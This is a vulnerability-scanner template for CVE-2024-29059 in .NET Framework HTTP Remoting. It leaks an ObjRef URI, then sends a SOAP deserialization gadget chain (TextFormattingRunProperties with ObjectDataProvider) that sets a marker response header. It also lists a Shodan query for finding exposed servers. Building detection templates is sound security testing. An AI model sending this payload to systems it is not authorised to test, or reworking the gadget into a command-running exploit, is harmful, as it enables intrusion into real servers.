http:
- extractors:
  - group: 1
    internal: true
    name: objref
    part: body_1
    regex:
    - (/[0-9a-f_]+/[0-9A-Za-z_+]+_[0-9]+\.rem)
    type: regex
  - dsl:
    - x_vuln_test
    type: dsl
  matchers:
  - condition: and
    dsl:
    - contains(body_1,'ObjRef')
    - contains(x_vuln_test,'{{randstr}}')
    type: dsl
  raw:
  - 'GET /RemoteApplicationMetadata.rem?wsdl HTTP/1.1

    Host: {{Hostname}}

    __RequestVerb: POST

    Content-Type: text/xml

    '
  - "POST {{objref}} HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: \"\"\nContent-Type:\
    \ text/xml\n\n<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\
    \ xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\"\
    \ SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n<a1:TextFormattingRunProperties\
    \ id=\"ref-1\" xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35\"\
    >\n<ForegroundBrush id=\"ref-3\">&#60;ObjectDataProvider MethodName=&#34;AddHeader&#34;\n\
    \  xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;\n\
    \  xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;\n  xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34;\n\
    \  xmlns:System.Web=&#34;clr-namespace:System.Web;assembly=System.Web&#34;&#62;&#60;ObjectDataProvider.ObjectInstance&#62;&#60;ObjectDataProvider\
    \ MethodName=&#34;get_Response&#34;&#62;&#60;ObjectDataProvider.ObjectInstance&#62;\n\
    \  &#60;ObjectDataProvider ObjectType=&#34;{x:Type System.Web:HttpContext}&#34;\
    \ MethodName=&#34;get_Current&#34; /&#62;\n  &#60;/ObjectDataProvider.ObjectInstance&#62;\n\
    \  &#60;/ObjectDataProvider&#62;\n  &#60;/ObjectDataProvider.ObjectInstance&#62;\n\
    \  &#60;ObjectDataProvider.MethodParameters&#62;\n  &#60;System:String&#62;X-Vuln-Test&#60;/System:String&#62;\n\
    \  &#60;System:String&#62;{{randstr}}&#60;/System:String&#62;\n  &#60;/ObjectDataProvider.MethodParameters&#62;\n\
    &#60;/ObjectDataProvider&#62;</ForegroundBrush>\n</a1:TextFormattingRunProperties>\n\
    </SOAP-ENV:Envelope>\n"
id: CVE-2024-29059
info:
  author: iamnoooob,rootxharsh,DhiyaneshDk,pdresearch
  classification:
    cpe: cpe:2.3:a:microsoft:.net_framework:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-29059
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    epss-percentile: 0.07503
    epss-score: 0.00043
  description: .NET Framework Information Disclosure Vulnerability
  metadata:
    max-request: 2
    product: .net_framework
    shodan-query: 'Server: MS .NET Remoting'
    vendor: microsoft
  name: .NET Framework - Leaking ObjRefs via HTTP .NET Remoting
  reference:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29059
  - https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/
  - https://github.com/codewhitesec/HttpRemotingObjRefLeak
  severity: high
  tags: cve,cve2024,dotnet,microsoft,remoting,deserialization
